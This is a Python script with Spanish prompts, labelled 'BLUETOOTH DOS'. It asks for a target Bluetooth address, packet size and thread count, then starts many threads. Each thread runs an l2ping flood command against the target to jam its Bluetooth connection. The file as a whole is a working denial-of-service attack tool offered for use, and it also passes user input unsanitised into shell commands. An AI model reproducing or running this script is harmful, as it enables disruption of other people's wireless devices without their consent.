import os
import threading
import time

def DOS(target_addr, packages_size):
    os.system('l2ping -i hci0 -s ' + str(packages_size) +' -f ' + target_addr)

def printLogo():
    print("Iniciando proyecto - BLUETOOTH DOS")

def main():
    printLogo()
    time.sleep(0.1)
    print('')
    if (input("listo para proceder? (y/n) > ") in ['y', 'Y']):
        time.sleep(0.1)
        os.system('clear')
        printLogo()
        print('')

        target_addr = input('Target address > ')

        if len(target_addr) < 1:
            print('[!] ERROR: fallo el objetivo')
            exit(0)

        try:
            packages_size = int(input('Packages size > '))
        except:
            print('[!] ERROR: El tamaño de los paquetes debe ser un número entero.')
            exit(0)
        try:
            threads_count = int(input('Threads count > '))
        except:
            print('[!] ERROR: El recuento de subprocesos debe ser un número entero.')
            exit(0)
        print('')
        os.system('clear')

        print("\x1b[31m[*] Interferencia de señal BT del dispositivo objetivo en 3 segundos...")

        for i in range(0, 3):
            print('[*] ' + str(3 - i))
            time.sleep(1)
        os.system('clear')
        print('[*] Construyendo hilos...\n')

        for i in range(0, threads_count):
            print('[*] Built thread №' + str(i + 1))
            threading.Thread(target=DOS, args=[str(target_addr), str(packages_size)]).start()

        print('[*] Construidos todos los hilos...')
        print('[*] Iniciando...')
    else:
        exit(0)

if __name__ == '__main__':
    try:
        os.system('clear')
        main()
    except KeyboardInterrupt:
        time.sleep(0.1)
        print('\n[*] cancelado')
        exit(0)
    except Exception as e:
        time.sleep(0.1)
        print('[!] ERROR: ' + str(e))




